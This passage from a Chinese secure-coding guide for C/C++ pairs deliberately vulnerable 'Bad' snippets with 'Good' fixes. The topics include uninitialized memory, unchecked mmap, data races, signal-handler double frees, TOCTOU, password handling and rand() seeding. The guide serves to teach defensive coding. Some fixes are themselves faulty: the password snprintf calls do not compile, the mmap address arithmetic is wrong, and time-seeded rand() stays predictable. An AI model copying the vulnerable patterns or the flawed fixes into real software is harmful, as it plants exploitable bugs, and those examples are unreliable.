id="2-7-【必须】检查复制粘贴的重复代码（相同代码通常代表错误）"><a href="#2-7-【必须】检查复制粘贴的重复代码（相同代码通常代表错误）" class="headerlink" title="2.7 【必须】检查复制粘贴的重复代码（相同代码通常代表错误）"></a>2.7 【必须】检查复制粘贴的重复代码（相同代码通常代表错误）</h4><p>当开发中遇到较长的句子时，如果你选择了复制粘贴语句，请记得检查每一行代码，不要出现上下两句一模一样的情况，这通常代表代码哪里出现了错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foobar</span><span class="params">(SomeStruct&amp; foobase, SomeStruct&amp; foo1, SomeStruct&amp; foo2)</span> </span>&#123;</span><br><span class="line">  foo1.bar = (foo1.bar &amp; <span class="number">0xffff</span>) | (foobase.base &amp; <span class="number">0xffff0000</span>);</span><br><span class="line">  foo1.bar = (foo1.bar &amp; <span class="number">0xffff</span>) | (foobase.base &amp; <span class="number">0xffff0000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上例，通常可能是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foobar</span><span class="params">(SomeStruct&amp; foobase, SomeStruct&amp; foo1, SomeStruct&amp; foo2)</span> </span>&#123;</span><br><span class="line">  foo1.bar = (foo1.bar &amp; <span class="number">0xffff</span>) | (foobase.base &amp; <span class="number">0xffff0000</span>);</span><br><span class="line">  foo2.bar = (foo2.bar &amp; <span class="number">0xffff</span>) | (foobase.base &amp; <span class="number">0xffff0000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最好是把重复的代码片段提取成函数，如果函数比较短，可以考虑定义为 <code>inline</code> 函数，在减少冗余的同时也能确保不会影响性能。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.8"></a></p><h4 id="2-8-【必须】左右一致的重复判断-x2F-永远为真或假的判断（通常代表错误）"><a href="#2-8-【必须】左右一致的重复判断-x2F-永远为真或假的判断（通常代表错误）" class="headerlink" title="2.8  【必须】左右一致的重复判断&#x2F;永远为真或假的判断（通常代表错误）"></a>2.8  【必须】左右一致的重复判断&#x2F;永远为真或假的判断（通常代表错误）</h4><p>这通常是由于自动完成或例如Visual Assistant X之类的补全插件导致的问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="keyword">if</span> (foo1.bar == foo1.bar) &#123;</span><br><span class="line">  …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="keyword">if</span> (foo1.bar == foo2.bar) &#123;</span><br><span class="line">  …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.9"></a></p><h4 id="2-9-【必须】函数每个分支都应有返回值"><a href="#2-9-【必须】函数每个分支都应有返回值" class="headerlink" title="2.9 【必须】函数每个分支都应有返回值"></a>2.9 【必须】函数每个分支都应有返回值</h4><p>函数的每个分支都应该有返回值，否则如果函数走到无返回值的分支，其结果是未知的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> bar)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bar &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bar &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述例子当bar&lt;10时，其结果是未知的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> bar)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bar &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bar &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启适当级别的警告（GCC 中为 <code>-Wreturn-type</code> 并已包含在 <code>-Wall</code> 中）并设置为错误，可以在编译阶段发现这类错误。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.10"></a></p><h4 id="2-10-【必须】不得使用栈上未初始化的变量"><a href="#2-10-【必须】不得使用栈上未初始化的变量" class="headerlink" title="2.10 【必须】不得使用栈上未初始化的变量"></a>2.10 【必须】不得使用栈上未初始化的变量</h4><p>在栈上声明的变量要注意是否在使用它之前已经初始化了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> foo;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">Bar</span>()) &#123;</span><br><span class="line">    foo = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Foobar</span>(foo); <span class="comment">// foo可能没有初始化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最好在声明的时候就立刻初始化变量，或者确保每个分支都初始化它。开启相应的编译器警告（GCC 中为 <code>-Wuninitialized</code>），并把设置为错误级别，可以在编译阶段发现这类错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> foo = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">Bar</span>()) &#123;</span><br><span class="line">    foo = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Foobar</span>(foo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.11"></a></p><h4 id="2-11-【建议】不得直接使用刚分配的未初始化的内存（如realloc）"><a href="#2-11-【建议】不得直接使用刚分配的未初始化的内存（如realloc）" class="headerlink" title="2.11  【建议】不得直接使用刚分配的未初始化的内存（如realloc）"></a>2.11  【建议】不得直接使用刚分配的未初始化的内存（如realloc）</h4><p>一些刚申请的内存通常是直接从堆上分配的，可能包含有旧数据的，直接使用它们而不初始化，可能会导致安全问题。例如，CVE-2019-13751。应确保初始化变量，或者确保未初始化的值不会泄露给用户。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* a = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">100</span>];</span><br><span class="line">  a[<span class="number">99</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(a, <span class="string">&quot;char&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* a = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(a, <span class="string">&quot;char&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  a[<span class="number">4</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 C++ 中，再次强烈推荐用 <code>string</code>、<code>vector</code> 代替手动内存分配。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.12"></a></p><h4 id="2-12-【必须】校验内存相关函数的返回值"><a href="#2-12-【必须】校验内存相关函数的返回值" class="headerlink" title="2.12 【必须】校验内存相关函数的返回值"></a>2.12 【必须】校验内存相关函数的返回值</h4><p>与内存分配相关的函数需要检查其返回值是否正确，以防导致程序崩溃或逻辑错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* bar = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x800000</span>, .....);</span><br><span class="line">  *(bar + <span class="number">0x400000</span>) = <span class="string">&#x27;\x88&#x27;</span>; <span class="comment">// Wrong</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上例mmap如果失败，bar的值将是0xffffffff (ffffffff)，第二行将会往0x3ffffff写入字符，导致越界写。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* bar = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x800000</span>, .....);</span><br><span class="line">  <span class="keyword">if</span>(bar == MAP_FAILED) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *(bar + <span class="number">0x400000</span>) = <span class="string">&#x27;\x88&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>高风险-越界操作</code></p><p><a id="1.2.13"></a></p><h4 id="2-13-【必须】不要在if里面赋值"><a href="#2-13-【必须】不要在if里面赋值" class="headerlink" title="2.13 【必须】不要在if里面赋值"></a>2.13 【必须】不要在if里面赋值</h4><p>if里赋值通常代表代码存在错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bar = <span class="number">0x99</span>) ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常应该是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bar == <span class="number">0x99</span>) ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建议在构建系统中开启足够的编译器警告（GCC 中为 <code>-Wparentheses</code> 并已包含在 <code>-Wall</code> 中），并把该警告设置为错误。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.14"></a></p><h4 id="2-14-【建议】确认if里面的按位操作"><a href="#2-14-【建议】确认if里面的按位操作" class="headerlink" title="2.14 【建议】确认if里面的按位操作"></a>2.14 【建议】确认if里面的按位操作</h4><p>if里，非bool类型和非bool类型的按位操作可能代表代码存在错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> bar = <span class="number">0x1</span>;     <span class="comment">// binary 01</span></span><br><span class="line">  <span class="type">int</span> foobar = <span class="number">0x2</span>;    <span class="comment">// binary 10</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (foobar &amp; bar)     <span class="comment">// result = 00, false</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码可能应该是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span>   bar = <span class="number">0x1</span>;</span><br><span class="line">  <span class="type">int</span> foobar = <span class="number">0x2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (foobar &amp;&amp; bar)  <span class="comment">// result : true</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.3"></a></p><h3 id="3-多线程"><a href="#3-多线程" class="headerlink" title="3    多线程"></a>3    多线程</h3><p><a id="1.3.1"></a></p><h4 id="3-1-【必须】变量应确保线程安全性"><a href="#3-1-【必须】变量应确保线程安全性" class="headerlink" title="3.1  【必须】变量应确保线程安全性"></a>3.1  【必须】变量应确保线程安全性</h4><p>当一个变量可能被多个线程使用时，应当使用原子操作或加锁操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">char</span>  g_somechar;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo_thread1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  g_somechar += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo_thread2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  g_somechar += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于可以使用原子操作的，应当使用一些可以确保内存安全的操作，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span> g_somechar;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo_thread1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  __sync_fetch_and_add(&amp;g_somechar, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo_thread2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  __sync_fetch_and_add(&amp;g_somechar, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 C 代码，<code>C11</code> 后推荐使用 <a href="https://en.cppreference.com/w/c/atomic">atomic</a> 标准库。<br>对于 C++代码，<code>C++11</code> 后，推荐使用 <a href="https://zh.cppreference.com/w/cpp/atomic/atomic"><code>std::atomic</code></a>。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑问题</code></p><p><a id="1.3.2"></a></p><h4 id="3-2-【必须】注意signal-handler导致的条件竞争"><a href="#3-2-【必须】注意signal-handler导致的条件竞争" class="headerlink" title="3.2 【必须】注意signal handler导致的条件竞争"></a>3.2 【必须】注意signal handler导致的条件竞争</h4><p>竞争条件经常出现在信号处理程序中，因为信号处理程序支持异步操作。攻击者能够利用信号处理程序争用条件导致软件状态损坏，从而可能导致拒绝服务甚至代码执行。</p><ol><li>当信号处理程序中发生不可重入函数或状态敏感操作时，就会出现这些问题。因为信号处理程序中随时可以被调用。比如，当在信号处理程序中调用<code>free</code>时，通常会出现另一个信号争用条件，从而导致双重释放。即使给定指针在释放后设置为<code>NULL</code>，在释放内存和将指针设置为<code>NULL</code>之间仍然存在竞争的可能。</li><li>为多个信号设置了相同的信号处理程序，这尤其有问题——因为这意味着信号处理程序本身可能会重新进入。例如，malloc()和free()是不可重入的，因为它们可能使用全局或静态数据结构来管理内存，并且它们被syslog()等看似无害的函数间接使用；这些函数可能会导致内存损坏和代码执行。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">char</span> *log_message;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Handler</span><span class="params">(<span class="type">int</span> signum)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">syslog</span>(LOG_NOTICE, <span class="string">&quot;%s\n&quot;</span>, log_m_essage);</span><br><span class="line">  <span class="built_in">free</span>(log_message);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  log_message = <span class="built_in">strdup</span>(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">signal</span>(SIGHUP, Handler);</span><br><span class="line">  <span class="built_in">signal</span>(SIGTERM, Handler);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以借由下列操作规避问题：</p><ol><li>避免在多个处理函数中共享某些变量。</li><li>在信号处理程序中使用同步操作。</li><li>屏蔽不相关的信号，从而提供原子性。</li><li>避免在信号处理函数中调用不满足<a href="https://www.man7.org/linux/man-pages/man7/signal-safety.7.html">异步信号安全</a>的函数。</li></ol><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑问题</code></p><p><a id="1.3.3"></a></p><h4 id="3-3-【建议】注意Time-of-check-Time-of-use-TOCTOU-条件竞争"><a href="#3-3-【建议】注意Time-of-check-Time-of-use-TOCTOU-条件竞争" class="headerlink" title="3.3 【建议】注意Time-of-check Time-of-use (TOCTOU) 条件竞争"></a>3.3 【建议】注意Time-of-check Time-of-use (TOCTOU) 条件竞争</h4><p>TOCTOU： 软件在使用某个资源之前检查该资源的状态，但是该资源的状态可以在检查和使用之间更改，从而使检查结果无效。当资源处于这种意外状态时，这可能会导致软件执行错误操作。</p><p>当攻击者可以影响检查和使用之间的资源状态时，此问题可能与安全相关。这可能发生在共享资源(如<strong>文件、内存</strong>，甚至多线程程序中的<strong>变量</strong>)上。在编程时需要注意避免出现TOCTOU问题。</p><p>例如，下面的例子中，该文件可能已经在检查和lstat之间进行了更新，特别是因为printf有延迟。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">stat</span> *st;</span><br><span class="line"></span><br><span class="line"><span class="built_in">lstat</span>(<span class="string">&quot;...&quot;</span>, st);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st-&gt;st_mtimespec == ...) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now updating things\n&quot;</span>);</span><br><span class="line">  <span class="built_in">UpdateThings</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TOCTOU难以修复，但是有以下缓解方案：</p><ol><li>限制对来自多个进程的文件的交叉操作。</li><li>如果必须在多个进程或线程之间共享对资源的访问，那么请尝试限制”检查“（CHECK）和”使用“（USE）资源之间的时间量，使他们相距尽量不要太远。这不会从根本上解决问题，但可能会使攻击更难成功。</li><li>在Use调用之后重新检查资源，以验证是否正确执行了操作。</li><li>确保一些环境锁定机制能够被用来有效保护资源。但要确保锁定是检查之前进行的，而不是在检查之后进行的，以便检查时的资源与使用时的资源相同。</li></ol><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑问题</code></p><p><a id="1.4"></a></p><h3 id="4-加密解密"><a href="#4-加密解密" class="headerlink" title="4    加密解密"></a>4    加密解密</h3><p><a id="1.4.1"></a></p><h4 id="4-1-【必须】不得明文存储用户密码等敏感数据"><a href="#4-1-【必须】不得明文存储用户密码等敏感数据" class="headerlink" title="4.1  【必须】不得明文存储用户密码等敏感数据"></a>4.1  【必须】不得明文存储用户密码等敏感数据</h4><p>用户密码应该使用 Argon2, scrypt, bcrypt, pbkdf2 等算法做哈希之后再存入存储系统, <a href="https://password-hashing.net/">https://password-hashing.net/</a></p><p><a href="https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage">https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage</a></p><p>用户敏感数据，应该做到传输过程中加密，存储状态下加密<br>传输过程中加密，可以使用 HTTPS 等认证加密通信协议</p><p>存储状态下加密，可以使用 SQLCipher 等类似方案。</p><p><a id="1.4.2"></a></p><h4 id="4-2-【必须】内存中的用户密码等敏感数据应该安全抹除"><a href="#4-2-【必须】内存中的用户密码等敏感数据应该安全抹除" class="headerlink" title="4.2  【必须】内存中的用户密码等敏感数据应该安全抹除"></a>4.2  【必须】内存中的用户密码等敏感数据应该安全抹除</h4><p>例如用户密码等，即使是临时使用，也应在使用完成后应当将内容彻底清空。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/crypto.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="function">string <span class="title">user_password</span><span class="params">(<span class="number">100</span>, <span class="string">&#x27;\0&#x27;</span>)</span></span>;</span><br><span class="line">        <span class="built_in">snprintf</span>(&amp;user_password, <span class="string">&quot;password: %s&quot;</span>, user_password.<span class="built_in">size</span>(), password_from_input);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">string <span class="title">user_password</span><span class="params">(<span class="number">100</span>, <span class="string">&#x27;\0&#x27;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;user_password, <span class="string">&quot;password: %s&quot;</span>, user_password.<span class="built_in">size</span>(), password_from_input);</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">OPENSSL_cleanse</span>(&amp;user_password[<span class="number">0</span>], user_password.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-敏感信息泄露</code></p><p><a id="1.4.3"></a></p><h4 id="4-3-【必须】rand-类函数应正确初始化"><a href="#4-3-【必须】rand-类函数应正确初始化" class="headerlink" title="4.3  【必须】rand() 类函数应正确初始化"></a>4.3  【必须】rand() 类函数应正确初始化</h4><p>rand类函数的随机性并不高。而且在使用前需要使用srand()来初始化。未初始化的随机数可能导致某些内容可预测。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> foo = <span class="built_in">rand</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码执行完成后，foo的值是固定的。它等效于 <code>srand(1); rand();</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">  <span class="type">int</span> foo = <span class="built_in">rand</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-逻辑漏洞</code></p><p><a id="1.4.4"></a></p><h4 id="4-4-【必须】在需要高强度安全加密时不应使用弱PRNG函数"><a href="#4-4-【必须】在需要高强度安全加密时不应使用弱PRNG函数" class="headerlink" title="4.4  【必须】在需要高强度安全加密时不应使用弱PRNG函数"></a>4.4  【必须】在需要高强度安全加密时不应使用弱PRNG函数</h4><p>在需要生成 AES&#x2F;SM1&#x2F;HMAC 等算法的密钥&#x2F;IV&#x2F;Nonce， RSA&#x2F;ECDSA&#x2F;ECDH 等算法的私钥，这类需要高安全性的业务场景，必须使用密码学安全的随机数生成器 (Cryptographically Secure PseudoRandom Number Generator (CSPRNG) ), 不得使用 <code>rand()</code> 